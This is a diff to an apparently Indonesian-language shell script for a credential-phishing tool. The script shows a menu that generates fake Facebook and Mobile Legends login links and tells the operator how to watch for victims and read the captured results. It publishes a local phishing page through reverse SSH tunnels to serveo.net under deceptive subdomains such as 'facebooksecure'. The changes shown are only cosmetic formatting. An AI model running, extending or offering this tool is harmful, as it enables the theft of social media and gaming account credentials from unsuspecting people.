@@ -11,7 +11,9 @@ echo $cy" PILIH LINK PHISING YANG SESUAI"
 echo $cy" JIKA LOG BERJALAN,BERARTI KORBAN SUDAH MASUK LINK"
 echo $cy" BUKA TAB BARU, JALANKAN"$pur" hasil.sh" $cy"untuk melihat hasilnya"
 echo $pur"___________________________________"
-echo $pur" GENERATE LINK"echoecho $pur"["$ku"1"$pur"]"$ku" FACEBOOK LINK"
+echo $pur" GENERATE LINK"
+echo
+echo $pur"["$ku"1"$pur"]"$ku" FACEBOOK LINK"
 echo $pur"["$ku"2"$pur"]"$ku" MOBILE LEGENDS LINK"
 echo $pur"___________________________________"
 echo $pur"╭─["$pur"root@r12n"$pur"]"
@@ -21,6 +23,7 @@ if [ $pil = 1 ]
 then
 ssh -R facebooksecure.serveo.net:80:localhost:8080 serveo.net
 fi 
+
 if [ $pil = 2 ]
 then
 ssh -R mobilelegends.serveo.net:80:localhost:8080 serveo.net
